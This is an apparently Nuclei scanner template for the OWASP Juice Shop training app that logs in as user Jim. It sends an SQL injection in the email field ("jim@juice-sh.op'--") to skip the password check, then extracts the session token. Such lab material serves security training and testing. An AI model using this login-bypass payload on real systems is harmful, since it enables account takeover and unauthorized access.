id: juice-shop-login-jim

info:
  name: Login Jim
  author: yelaco
  severity: high
  tags: juice-shop,sqli,login
  description: Log in with Jimâ€™s user account

requests:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"

    headers:
      Content-Type: application/json

    body: |
      {
        "email": "jim@juice-sh.op'--",
        "password": "irrelevant"
      }

    matchers:
      - type: word
        part: body
        words:
          - "authentication"
          - "token"
        condition: and

    extractors:
      - type: json
        json:
          - ".authentication.token"
